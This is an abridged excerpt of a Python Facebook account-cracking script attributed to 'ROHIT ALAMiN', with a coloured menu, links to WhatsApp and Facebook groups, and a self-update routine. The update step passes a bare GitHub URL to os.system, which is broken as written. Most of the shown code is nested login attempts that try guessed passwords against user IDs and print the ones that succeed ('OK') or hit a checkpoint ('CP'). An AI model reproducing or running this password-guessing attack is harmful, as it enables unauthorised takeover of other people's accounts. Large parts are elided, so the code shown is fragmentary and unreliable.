...
#AUTHOR : ROHIT ALAMiN (ROHIT Psycho)

#OPEN SOURCE :)

#DON'T FORGET TO GIVE CREDIT TO ROHIT ALAMiN
...
try:
	...
	os.system("python2 ROHITClone.py")
...
def main():
	...
	print("\033[92;1m  [01] START ROHIT CRACK")

	print("\033[93;1m  [02] HOW TO GET ACCESS TOKEN")

	print("\033[94;1m  [03] UPDATE ROHIT TOOL")

	print("\033[96;1m  [04] JOIN ROHIT FACEBOOKGROUP")
...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://chat.whatsapp.com/LAQB8V7ATJJEfU2HRRDOpR"])
		...
		try:
			...
			os.system("https://github.com/ROHITLOVEYOU/ROHITClone.git")

			os.system("rm -rf ROHITClone.py")

			os.system("cp -f ROHITClone/ROHITClone.py \\.")

			os.system("rm -rf ROHITClone")
		...
		subprocess.check_output(["am", "start", "https://facebook.com/groups/372726674905691/?ref=share"])
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													if "access_token" in data.text and "EAAA" in data.text:
														...
														print(" \033[1;32m[ROHIT-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in data.json()['error_msg']:
															...
															print(" \033[1;33m[ROHIT-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																print(" \033[1;32m[ROHIT-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	print(" \033[1;33m[ROHIT-CP] "+uid+" | "+pass7+"\033[0;97m")
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m[ROHIT-OK] "+uid+" | "+pass8+"\033[0;97m")
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m[ROHIT-CP] "+uid+" | "+pass8+"\033[0;97m")
